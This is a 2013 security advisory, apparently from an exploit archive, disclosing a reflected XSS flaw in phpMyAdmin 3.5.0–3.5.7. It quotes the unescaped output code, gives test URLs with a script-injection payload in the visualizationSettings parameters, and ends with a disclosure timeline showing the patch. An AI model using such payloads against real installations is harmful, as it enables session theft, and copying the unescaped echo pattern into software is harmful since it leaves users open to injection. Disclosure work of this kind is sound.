@@ -1,0 +1,79 @@
+id: 20640
+date: 04/10/2013
+title: phpMyAdmin 3.5.7 Cross Site Scripting Vulnerability
+author: waraxe
+cves: 
+
+Reflected XSS in phpMyAdmin 3.5.7
+====================================================
+
+Author: Janek Vind "waraxe"
+Date: 09. April 2013
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-102.html
+
+
+Description of vulnerable software:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+phpMyAdmin is a free software tool written in PHP, intended to handle the
+administration of MySQL over the World Wide Web. phpMyAdmin supports a wide
+range of operations with MySQL.
+
+http://www.phpmyadmin.net/home_page/index.php
+
+Affected are versions 3.5.0 to 3.5.7, older versions not vulnerable.
+
+
+###############################################################################
+1. Reflected XSS in "tbl_gis_visualization.php"
+###############################################################################
+
+Reason:
+1. insufficient sanitization of html output
+Attack vectors:
+1. user-supplied parameters "visualizationSettings[width]" and "visualizationSettings[height]"
+Preconditions:
+1. valid session
+2. "token" parameter must be known
+3. valid database name must be known
+
+
+Php script "tbl_gis_visualization.php" line 51:
+------------------------[ source code start ]----------------------------------
+// Get settings if any posted
+$visualizationSettings = array();
+if (PMA_isValid($_REQUEST['visualizationSettings'], 'array')) {
+    $visualizationSettings = $_REQUEST['visualizationSettings'];
+..
+<legend><?php echo __('Display GIS Visualization'); ?></legend>
+<div id="placeholder" style="width:<?php echo($visualizationSettings['width']); ?>px;
+                         height:<?php echo($visualizationSettings['height']); ?>px;">
+------------------------[ source code end ]------------------------------------
+
+
+Tests (parameters "db" and "token" must be valid):
+
+http://localhost/PMA/tbl_gis_visualization.php?db=information_schema&
+token=17961b7ab247b6d2b39d730bf336cebb&
+visualizationSettings[width]="><script>alert(123);</script>
+
+http://localhost/PMA/tbl_gis_visualization.php?db=information_schema&
+token=17961b7ab247b6d2b39d730bf336cebb
+&visualizationSettings[height]="><script>alert(123);</script>
+
+
+Result: javascript alert box pops up, confirming Reflected XSS vulnerability.
+
+
+Disclosure timeline:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+31.03.2013 -> Sent email to developers
+31.03.2013 -> First response email from developers
+02.04.2013 -> Second email from developers - XSS patched in Git repository
+03.04.2013 -> phpMyAdmin 3.5.8-rc1 is released
+08.04.2013 -> phpMyAdmin 3.5.8 is released
+09.04.2013 -> public advisory released
+
+#  0day.today [2023-03-24]  #
